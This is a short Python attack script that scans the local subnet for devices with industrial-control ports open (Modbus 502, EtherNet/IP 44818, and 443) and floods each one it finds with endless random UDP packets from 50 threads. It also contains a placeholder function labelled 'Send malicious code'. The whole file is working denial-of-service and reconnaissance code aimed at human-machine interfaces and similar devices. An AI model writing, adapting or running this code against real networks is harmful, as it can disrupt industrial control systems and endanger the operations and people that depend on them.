import subprocess
import threading
import time
import socket
import random

ip_list = []
hmi = {}
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(2048)
time.sleep(3)
sent = 0


def attack(ip, port):
    global sent, bytes
    print(ip, type(ip))
    print(port, type(port))
    while True:
        sock.sendto(bytes, (ip, port))

def send_cmd(ip, port):
    print("Send malicious code")
    pass


def ip_exist(ip):
    global ip_list, hmi
    hmi_ports = (502, 44818, 443)
    res = subprocess.run(["ping", ip], capture_output=True)
    if "Approximate round" in res.stdout.decode("UTF-8"):
        ip_list.append(ip)
        for port in hmi_ports:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket.setdefaulttimeout(1)

            # returns an error indicator
            result = s.connect_ex((ip, port))
            if result == 0:
                print(f"Start attack --> {ip}:{port}")
                send_cmd(ip, port)
                for i in range(50):
                    threading.Thread(target=attack, args=[ip, port]).start()
                hmi.update({ip: port})


def ipscanning():
    global ip_list, hmi
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))

    local_ip = s.getsockname()[0]
    build_ip = local_ip.split(".")
    builder = f"{build_ip[0]}.{build_ip[1]}.{build_ip[2]}"
    print(f"[+] Local IP --> {local_ip}")
    print(f"[+] Scanning ip --> {builder}.255\n ")

    for class_d in range(1, 255):
        ip = f"{builder}.{class_d}"
        while threading.active_count() > 400:
            pass
        threading.Thread(target=ip_exist, args=[ip]).start()

ipscanning()